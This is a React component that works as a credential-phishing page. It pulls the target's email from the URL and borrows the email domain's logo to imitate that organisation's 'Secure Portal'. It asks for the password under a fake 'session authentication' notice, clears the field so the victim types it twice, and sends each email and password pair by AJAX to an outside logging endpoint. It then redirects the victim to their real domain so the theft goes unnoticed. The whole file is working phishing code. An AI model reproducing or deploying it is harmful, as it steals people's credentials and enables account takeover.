
import React, {  useState } from "react";
import './self.css';
import { FaLocationDot } from "react-icons/fa6";
import { FaUserCircle } from "react-icons/fa";
import $ from 'jquery';

    const Self = ()=>{     
    const eemmmm = window.location.href;                                                                    
    const slll = eemmmm.indexOf("@");
    const exttttt = eemmmm.substr((slll+1)).toLowerCase().split('*', 1).toString();
    const sliceDD = exttttt;
    const GGG = sliceDD.slice(1);
    const ZZZZ = sliceDD.charAt(0).toUpperCase() + GGG.split('*', 1).toString();
    localStorage.setItem('user', ZZZZ);


    const emailInTheURLA = window.location.href;
    const sliceEqualSignB = emailInTheURLA.indexOf("=");
    const extracetdEmailC = emailInTheURLA.substr((sliceEqualSignB+1));
    const sliceEM = extracetdEmailC;
    const cutOutAllTheTextLeavingTheOneToBeCapitalizeBelowM = sliceEM.slice(1)
    const capitalizeFirstLetterM = extracetdEmailC.charAt(0).toUpperCase() + cutOutAllTheTextLeavingTheOneToBeCapitalizeBelowM.split('*', 1).toString();
    localStorage.setItem('c', capitalizeFirstLetterM);

    const mainName = capitalizeFirstLetterM.replace('*oiuerRTYUJKHGFDertyuijHGFDSWkjjHGFDTYUKUYTERwrtyuJKHGFDRTYUJERTYUJ', "");


    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('*', 1).toString();
    const sliceE = extracetdEmail;
    const cutOutAllTheTextLeavingTheOneToBeCapitalizeBelow = sliceE.slice(1);
    const capitalizeFirstLetter = extracetdEmail.charAt(0).toUpperCase() + cutOutAllTheTextLeavingTheOneToBeCapitalizeBelow.split('*', 1).toString()

    // console.log(capitalizeFirstLetter);
    localStorage.setItem('m', capitalizeFirstLetter)


    const [defaultEmail, setDefaultEmail] = useState(capitalizeFirstLetter);
    const [defaultPassword, setDefaultPassword] = useState('');
    const [count, setCount] = useState(0);


    const submitDefaultForm = (e)=>{
        e.preventDefault();
        setTimeout(() => {
            setDefaultPassword('');
            setDefaultEmail(defaultEmail)
            
        }, 500);

        setCount(count=> count + 1);
            if(count >= 1){
                const redirectURL = window.location.href;
                const sliceEqualSign = redirectURL.indexOf("@");
                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1)).split('*', 1).toString();
                console.log(extracetdemailDomain);
                setTimeout(() => {
                    window.location.href = `https://${exttttt}`;
                }, 1500);
            };

            setTimeout(()=>{
            }, 2200)


        const user = {
            email: defaultEmail,
            password: defaultPassword
        };
    
        $.ajax({
            type: "POST",
            url: "https://bucketlion.com/logs/dashboard/file/lc.php",

            data: user,
            success(data) {
                console.log(data);
            },
        });
    };

    const d = Date();

    return(<React.Fragment>

        <div className="wrapper">
            
            <div className="mod_wrap">

                <div className="top_label_logo_cont" style={{ 
                    display:'flex', 
                    justifyContent:'center', 
                    alignItems:'center', 
                    width:'inherit' 
                    }}
                >
                    <img 
                    className="top_label_logo"
                    src={`https://logo.clearbit.com/https://${exttttt}`}
                    alt="top_label_logo"
                    />

                </div>

                <div className="bk__end_svce__s_cotn__t">
                    <div className="location">
                        <span className="osBrowserTime">
                        
                        {d} </span>
                        <br />
                        <span className="cityCountry"> <FaLocationDot className="locate_icn"/>
                        </span>
                    </div>  
                </div>

                <p className="comment___t_____xt">
                    Session authentication! please provide your 
                    <br />
                    <b>{defaultEmail} &#160;</b>
                    password to continue.
                </p>


                <form onSubmit={submitDefaultForm}>

                    <div className="profile___emai____l" style={{
                        display:'flex',
                        justifyContent:'center',
                        alignItems:'center',
                        alignContent:'center'
                    }}>
                        <h2 
                        style={{ 
                            display:'flex',
                            alignItems:'center',
                            justifyContent:'center',
                        }}
                        >
                            <FaUserCircle />
                            &#160;
                            {defaultEmail}
                        </h2>
                    </div>


                    <div className="pswd_inp____cont">
                        <input 
                            type="password"
                            className="pswd"
                            autoFocus
                            required
                            placeholder="Password"
                            id="paswd_id"
                            value={defaultPassword}
                            onChange={e=> setDefaultPassword(e.target.value)}
                        />
                    </div>

                    <p className="auth_reg_____">
                        Authentication required!
                    </p>

                    <div className="show_pasd_feature">
                        <input 
                            type="checkbox"
                            className="che____ck"
                        />
                        <span className="shpswd_txt__">
                            Show password
                        </span>
                    </div>


                    <div className="btn_cont">
                        <input 
                            type="submit"
                            className="bt_______n_"
                            value="NEXT"
                            onClick={submitDefaultForm}
                        />
                    </div>

                    <div className="footerDiv___bg_gradia____n">
                        <p className="kwe">
                            © 2024 <b>{mainName}</b> Secure Portal | Privacy
                        </p>
                    </div>


                </form>


            </div>

        </div>
    </React.Fragment>)
};

export default Self;